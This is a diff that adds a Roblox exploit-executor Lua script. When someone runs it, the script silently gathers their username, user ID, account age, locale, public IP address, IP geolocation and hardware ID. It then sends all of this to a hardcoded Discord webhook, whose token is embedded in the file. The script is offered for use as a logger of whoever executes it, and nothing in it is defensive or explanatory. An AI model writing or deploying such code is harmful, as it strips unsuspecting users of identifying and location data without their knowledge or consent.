@@ -1,0 +1,87 @@
+-- New webhook who executed your fucking script
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+-- Detecting Executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Unsupported"
+    return executor
+end
+
+-- Creating Webhook Data
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "[Player Info](https://www.roblox.com/users/%d)" ..
+                    " \nDisplay Name: %s \nUsername: %s \nUser Id: %d\nMembershipType: %s" ..
+                    "\nAccountAge: %d\nCountry: %s\nIP: %s\nHwid: %s\nDate: %s\nTime: %s" ..
+                    "\n\n[Game Info](https://www.roblox.com/games/%d)" ..
+                    "\nGame: %s \nGame Id: %d \nExploit: %s" ..
+                    "\n\nData:%s``\n\nJobId:%s``",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
+                ["thumbnail"] = {
+                    ["url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Replace the webhook URL with your own URL
+local webhookUrl = "https://discord.com/api/webhooks/1453663063206006837/1cPah-IMObV-PS8wrKjPchmjFcbhY_DLqimeCwzQvgaeQcB3kitkmo5JFig6tDLg1lNQ"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
